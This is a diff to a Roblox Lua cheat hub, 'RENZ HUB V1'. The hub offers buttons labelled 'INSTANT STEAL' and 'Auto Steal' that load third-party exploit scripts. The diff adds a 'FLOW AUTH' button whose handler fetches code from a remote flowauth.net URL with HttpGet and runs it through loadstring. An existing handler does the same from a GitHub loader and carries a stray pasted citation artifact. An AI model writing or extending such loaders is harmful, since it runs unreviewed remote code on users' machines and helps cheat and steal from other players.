@@ -10,7 +10,7 @@ screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 650, 0, 400)
+mainFrame.Size = UDim2.new(0, 650, 0,500)
 mainFrame.Position = UDim2.new(0.5, -325, 0.5, -200)
 mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
 mainFrame.BorderSizePixel = 0
@@ -51,7 +51,7 @@ local instantBtn = makeButton("INSTANT STEAL\nLOAD", UDim2.new(0, 20, 0, 160), m
 local senaBtn = makeButton("SENA HUB 5.2\nLOAD", UDim2.new(0, 320, 0, 160), mainFrame)
 local chilliBtn = makeButton("CHILLI HUB\nLOAD", UDim2.new(0, 20, 0, 260), mainFrame)
 local ubBtn = makeButton("UB HUB (BEST)\nLOAD", UDim2.new(0, 320, 0, 260), mainFrame)
-
+local flowBtn = makeButton("FLOW AUTH\nLOAD", UDim2.new(0, 20, 0, 360), mainFrame)
 -- CLOSE BUTTON
 local closeBtn = Instance.new("TextButton", mainFrame)
 closeBtn.Size = UDim2.new(0, 30, 0, 30)
@@ -86,5 +86,7 @@ end)
 ubBtn.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/TeamUBHub/UBLoader/refs/heads/main/Loader.lua"))() -- UB Hub Auto Steal【4228700512875534555†L143-L147】
 end)
-
+flowBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/a31003a235b2c0b094eb90c236eed925.lua"))()
+end)
 print("RENZ HUB V1 Loaded - All buttons fixed!")
